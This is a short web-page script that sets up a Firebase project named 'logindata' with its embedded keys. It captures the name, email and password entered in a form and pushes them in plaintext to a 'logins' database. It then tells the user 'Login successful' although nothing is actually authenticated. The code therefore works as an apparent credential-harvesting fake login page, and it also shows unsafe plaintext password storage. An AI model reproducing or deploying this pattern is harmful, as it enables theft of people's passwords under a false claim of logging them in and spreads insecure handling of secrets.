        <script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";


// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyAjvf5ybzqm9-_b6dO8G75jHZRzNqHLjhI",
    authDomain: "logindata-64e6a.firebaseapp.com",
    databaseURL: "https://logindata-64e6a-default-rtdb.firebaseio.com",
    projectId: "logindata-64e6a",
    storageBucket: "logindata-64e6a.appspot.com",
    messagingSenderId: "969640992562",
    appId: "1:969640992562:web:42587a35d508afb098012b"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app); // Initialize the database
const messagesRef = ref(db, 'logins');

document.getElementById('messageForm').addEventListener('submit', function (e) {
  e.preventDefault();
  var name = document.getElementById('name').value;
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;

  // Get a reference to the 'logins' node in your database
 

  // Save the user data to Firebase database
  push(messagesRef, {
    name: name,
    email: email,
    password: password
  })
  .then(() => {
    alert('Login successful');
    document.getElementById('name').value = '';
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
  })
  .catch(error => {
    alert('Error occurred while saving user data');
    console.error(error);
    
  });
});
